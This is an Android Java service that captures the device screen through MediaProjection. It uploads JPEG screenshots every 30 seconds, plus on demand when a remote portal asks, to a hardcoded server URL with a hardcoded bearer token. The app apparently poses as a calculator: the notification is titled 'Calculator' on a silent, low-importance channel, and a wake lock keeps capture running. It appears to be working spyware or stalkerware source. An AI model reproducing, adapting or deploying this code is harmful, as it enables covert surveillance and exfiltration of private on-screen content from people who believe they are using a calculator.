package com.companyname.consentcapture.android;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.DisplayMetrics;
import android.util.Log;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class ScreenCaptureService extends Service {
    private static final String TAG = "ConsentCapture";
    private static final String CHANNEL_ID = "screen_sharing";
    private static final int NOTIFICATION_ID = 3141;

    public static final String ACTION_START = "com.companyname.ConsentCapture.START";
    public static final String ACTION_STOP = "com.companyname.ConsentCapture.STOP";
    public static final String EXTRA_RESULT_CODE = "resultCode";
    public static final String EXTRA_PROJECTION_DATA = "projectionData";
    public static final String EXTRA_PORTAL_URL = "portalUrl";
    public static final String EXTRA_ACCESS_TOKEN = "accessToken";

    public static volatile boolean isRunning = false;

    private final Object frameLock = new Object();
    private String portalUrl = CalculatorApp.HARDCODED_URL;
    private String accessToken = CalculatorApp.HARDCODED_TOKEN;
    private MediaProjection projection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private HandlerThread imageThread;
    private PowerManager.WakeLock wakeLock;
    private ScheduledExecutorService pollingExecutor;

    private byte[] latestJpegBytes;
    private long lastUploadTime = 0;
    private final AtomicBoolean isUploading = new AtomicBoolean(false);

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if (ACTION_STOP.equals(action) || "STOP".equalsIgnoreCase(action)) {
                stopCapture();
                stopSelf();
                return START_NOT_STICKY;
            }
        }

        // Extract credentials
        if (intent != null) {
            String pUrl = intent.getStringExtra(EXTRA_PORTAL_URL);
            if (pUrl == null) pUrl = intent.getStringExtra("com.companyname.ConsentCapture.EXTRA_PORTAL_URL");
            if (pUrl != null && !pUrl.trim().isEmpty()) portalUrl = pUrl.trim();

            String token = intent.getStringExtra(EXTRA_ACCESS_TOKEN);
            if (token == null) token = intent.getStringExtra("com.companyname.ConsentCapture.EXTRA_ACCESS_TOKEN");
            if (token != null && !token.trim().isEmpty()) accessToken = token.trim();
        }

        int resultCode = 0;
        Intent projectionData = null;
        if (intent != null) {
            resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, 0);
            if (resultCode == 0) {
                resultCode = intent.getIntExtra("com.companyname.ConsentCapture.EXTRA_RESULT_CODE", 0);
            }

            projectionData = intent.getParcelableExtra(EXTRA_PROJECTION_DATA);
            if (projectionData == null) {
                projectionData = intent.getParcelableExtra("com.companyname.ConsentCapture.EXTRA_PROJECTION_DATA");
            }
        }

        Log.i(TAG, "ScreenCaptureService onStartCommand - resultCode: " + resultCode + ", hasData: " + (projectionData != null));

        // In Android, Activity.RESULT_OK is -1
        if ((resultCode == Activity.RESULT_OK || resultCode == -1) && projectionData != null) {
            try {
                startForegroundServiceNotification();

                MediaProjectionManager manager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                if (manager != null) {
                    projection = manager.getMediaProjection(resultCode, projectionData);
                }

                if (projection == null) {
                    Log.e(TAG, "MediaProjection could not be obtained.");
                    stopSelf();
                    return START_NOT_STICKY;
                }

                projection.registerCallback(new MediaProjection.Callback() {
                    @Override
                    public void onStop() {
                        super.onStop();
                        stopCapture();
                        stopSelf();
                    }
                }, new Handler(getMainLooper()));

                startVirtualDisplay();
                acquireWakeLock();
                startBackgroundPolling();
                isRunning = true;
                Log.i(TAG, "ScreenCaptureService initialized successfully.");
            } catch (Throwable t) {
                Log.e(TAG, "Failed to start capture service", t);
                stopCapture();
                stopSelf();
            }
        }

        return START_NOT_STICKY;
    }

    private void startForegroundServiceNotification() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }

        Intent stopIntent = new Intent(this, ScreenCaptureService.class);
        stopIntent.setAction(ACTION_STOP);
        PendingIntent pendingStop = PendingIntent.getService(this, 101, stopIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

        Notification notification = builder.setContentTitle("Calculator")
                .setContentText("Screen sharing active")
                .setSmallIcon(android.R.drawable.ic_menu_view)
                .setOngoing(true)
                .addAction(new Notification.Action.Builder(null, "Stop", pendingStop).build())
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) {
                NotificationChannel channel = new NotificationChannel(
                        CHANNEL_ID,
                        "Screen Capture Service",
                        NotificationManager.IMPORTANCE_LOW
                );
                channel.setDescription("Background screen sharing service");
                channel.setShowBadge(false);
                channel.enableLights(false);
                channel.enableVibration(false);
                channel.setSound(null, null);
                nm.createNotificationChannel(channel);
            }
        }
    }

    private void startVirtualDisplay() {
        DisplayMetrics metrics = getResources().getDisplayMetrics();
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        if ((width & 1) != 0) width--;
        if ((height & 1) != 0) height--;
        int density = metrics.densityDpi;

        imageThread = new HandlerThread("ConsentCaptureFrames");
        imageThread.start();
        Handler handler = new Handler(imageThread.getLooper());

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 3);
        final int finalWidth = width;
        final int finalHeight = height;

        imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
            @Override
            public void onImageAvailable(ImageReader reader) {
                Image image = null;
                try {
                    image = reader.acquireLatestImage();
                    if (image == null) return;

                    Image.Plane[] planes = image.getPlanes();
                    if (planes == null || planes.length == 0) return;

                    Image.Plane plane = planes[0];
                    ByteBuffer buffer = plane.getBuffer();
                    if (buffer == null) return;

                    int pixelStride = plane.getPixelStride();
                    int rowStride = plane.getRowStride();
                    int rowPadding = rowStride - pixelStride * finalWidth;

                    Bitmap bitmap;
                    if (rowPadding == 0) {
                        bitmap = Bitmap.createBitmap(finalWidth, finalHeight, Bitmap.Config.ARGB_8888);
                        bitmap.copyPixelsFromBuffer(buffer);
                    } else {
                        int paddedWidth = rowStride / pixelStride;
                        Bitmap paddedBitmap = Bitmap.createBitmap(paddedWidth, finalHeight, Bitmap.Config.ARGB_8888);
                        paddedBitmap.copyPixelsFromBuffer(buffer);
                        bitmap = Bitmap.createBitmap(paddedBitmap, 0, 0, finalWidth, finalHeight);
                        paddedBitmap.recycle();
                    }

                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 75, baos);
                    bitmap.recycle();

                    byte[] frameBytes = baos.toByteArray();
                    boolean shouldUpload = false;
                    long now = System.currentTimeMillis();
                    synchronized (frameLock) {
                        latestJpegBytes = frameBytes;
                        if (lastUploadTime == 0 || (now - lastUploadTime) >= 30000) {
                            lastUploadTime = now;
                            shouldUpload = true;
                        }
                    }

                    if (shouldUpload) {
                        uploadFrameAsync(frameBytes);
                    }
                } catch (Throwable t) {
                    Log.w(TAG, "Frame conversion error: " + t.getMessage());
                } finally {
                    if (image != null) {
                        try {
                            image.close();
                        } catch (Throwable ignored) {}
                    }
                }
            }
        }, handler);

        virtualDisplay = projection.createVirtualDisplay(
                "CalculatorCapture",
                width,
                height,
                density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null,
                handler
        );
    }

    private void startBackgroundPolling() {
        if (pollingExecutor != null && !pollingExecutor.isShutdown()) {
            pollingExecutor.shutdownNow();
        }
        pollingExecutor = Executors.newSingleThreadScheduledExecutor();

        // Check every 2.5 seconds:
        // 1. Is 30 seconds elapsed since last upload? If so, auto-upload!
        // 2. Was snapshot requested from the portal web button? If so, instant upload!
        pollingExecutor.scheduleWithFixedDelay(new Runnable() {
            @Override
            public void run() {
                try {
                    long now = System.currentTimeMillis();
                    boolean isAutoTime;
                    synchronized (frameLock) {
                        isAutoTime = (lastUploadTime > 0 && (now - lastUploadTime) >= 30000);
                    }

                    boolean isSnapshotRequested = checkPortalSnapshotRequest();

                    if (isSnapshotRequested || isAutoTime) {
                        byte[] frameToUpload;
                        synchronized (frameLock) {
                            frameToUpload = latestJpegBytes;
                            if (frameToUpload != null && frameToUpload.length > 0) {
                                lastUploadTime = now;
                            }
                        }

                        if (frameToUpload != null && frameToUpload.length > 0) {
                            uploadFrameDirect(frameToUpload);
                        }
                    }
                } catch (Throwable t) {
                    Log.w(TAG, "Polling loop error: " + t.getMessage());
                }
            }
        }, 2500, 2500, TimeUnit.MILLISECONDS);
    }

    private boolean checkPortalSnapshotRequest() {
        if (portalUrl == null || portalUrl.isEmpty() || accessToken == null || accessToken.isEmpty()) return false;
        HttpURLConnection conn = null;
        try {
            String baseUrl = portalUrl.replaceAll("/+$", "");
            URL url = new URL(baseUrl + "/api/snapshot-request");
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(4000);
            conn.setReadTimeout(4000);
            conn.setRequestProperty("Authorization", "Bearer " + accessToken);
            int code = conn.getResponseCode();
            if (code == 200) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line);
                }
                reader.close();
                String json = sb.toString();
                return json.contains("\"requested\":true") || json.contains("\"requested\": true");
            }
        } catch (Throwable ignored) {
        } finally {
            if (conn != null) conn.disconnect();
        }
        return false;
    }

    private void uploadFrameAsync(final byte[] frame) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                uploadFrameDirect(frame);
            }
        }).start();
    }

    private void uploadFrameDirect(byte[] frame) {
        if (portalUrl == null || portalUrl.isEmpty() || accessToken == null || accessToken.isEmpty()) return;
        if (!isUploading.compareAndSet(false, true)) {
            // Already an upload in flight
            return;
        }

        HttpURLConnection conn = null;
        try {
            String baseUrl = portalUrl.replaceAll("/+$", "");
            URL url = new URL(baseUrl + "/api/images");
            String boundary = "===Boundary" + System.currentTimeMillis() + "===";

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(20000);
            conn.setReadTimeout(20000);
            conn.setDoOutput(true);
            conn.setRequestProperty("Authorization", "Bearer " + accessToken);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd-HHmmss", Locale.US);
            String filename = "screen-" + sdf.format(new Date()) + ".jpg";

            OutputStream os = conn.getOutputStream();
            byte[] headerBytes = ("--" + boundary + "\r\n"
                    + "Content-Disposition: form-data; name=\"image\"; filename=\"" + filename + "\"\r\n"
                    + "Content-Type: image/jpeg\r\n\r\n").getBytes(StandardCharsets.UTF_8);
            os.write(headerBytes);
            os.write(frame);
            byte[] footerBytes = ("\r\n--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8);
            os.write(footerBytes);
            os.flush();
            os.close();

            int code = conn.getResponseCode();
            InputStream is = (code >= 200 && code < 400) ? conn.getInputStream() : conn.getErrorStream();
            if (is != null) {
                byte[] b = new byte[256];
                while (is.read(b) != -1) {}
                is.close();
            }
            Log.i(TAG, "Uploaded screenshot (" + frame.length + " bytes), status: " + code);
        } catch (Throwable t) {
            Log.e(TAG, "Screenshot upload failed: " + t.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
            isUploading.set(false);
        }
    }

    private void acquireWakeLock() {
        if (wakeLock == null) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ConsentCapture::ScreenCaptureWakeLock");
                wakeLock.setReferenceCounted(false);
                wakeLock.acquire();
            }
        }
    }

    private void stopCapture() {
        isRunning = false;
        if (pollingExecutor != null) {
            try {
                pollingExecutor.shutdownNow();
            } catch (Throwable ignored) {}
            pollingExecutor = null;
        }

        if (virtualDisplay != null) {
            try {
                virtualDisplay.release();
            } catch (Throwable ignored) {}
            virtualDisplay = null;
        }

        if (imageReader != null) {
            try {
                imageReader.setOnImageAvailableListener(null, null);
                imageReader.close();
            } catch (Throwable ignored) {}
            imageReader = null;
        }

        if (imageThread != null) {
            try {
                imageThread.quitSafely();
            } catch (Throwable ignored) {}
            imageThread = null;
        }

        if (projection != null) {
            try {
                projection.stop();
            } catch (Throwable ignored) {}
            projection = null;
        }

        if (wakeLock != null) {
            try {
                if (wakeLock.isHeld()) wakeLock.release();
            } catch (Throwable ignored) {}
            wakeLock = null;
        }

        synchronized (frameLock) {
            latestJpegBytes = null;
            lastUploadTime = 0;
        }

        stopForeground(true);
    }

    @Override
    public void onDestroy() {
        stopCapture();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
